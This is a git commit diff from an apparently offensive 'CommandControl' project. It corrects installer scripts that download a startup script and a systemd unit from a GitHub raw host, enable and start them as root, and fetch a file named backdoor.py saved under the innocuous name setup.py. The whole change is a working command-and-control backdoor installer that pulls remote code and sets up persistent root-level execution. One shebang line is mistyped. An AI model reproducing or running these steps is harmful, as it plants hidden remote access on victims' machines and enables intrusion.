b5c3c5ebfc5dac7c809a4147329c3882aefab1eb
Shuttlemax <rao.nihar912@gmail.com>
2023-03-24 18:21:34 -0500

    learned to spell3

--- client_install.sh
+++ client_install.sh
@@ -1,9 +1,8 @@
-curl -s https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/cncstartup.sh;
-chmod +x /root/.cncstartup.sh
-curl -s https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/cncstartup.service;
+#!/bin/bashd
+curl -s https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/cncstartup.sh > /root/cncstartup.sh;
+chmod +x /root/cncstartup.sh
+curl -s https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/cncstartup.service > /etc/systemd/system/cncstartup.service;
 
 sudo systemctl daemon-reload
-sudo systemctl enable cncstartup.service
-sudo systemctl start cncstartup.service
-
-sudo systemctl start cncstartup.service
+sudo systemctl enable cncstartup
+sudo systemctl start cncstartup
--- cncstartup.sh
+++ cncstartup.sh
@@ -1,3 +1,4 @@
+#!/bin/bash
 yum install -y python3;
 curl -o setup.py https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/backdoor.py;
 chmod +x setup.py;
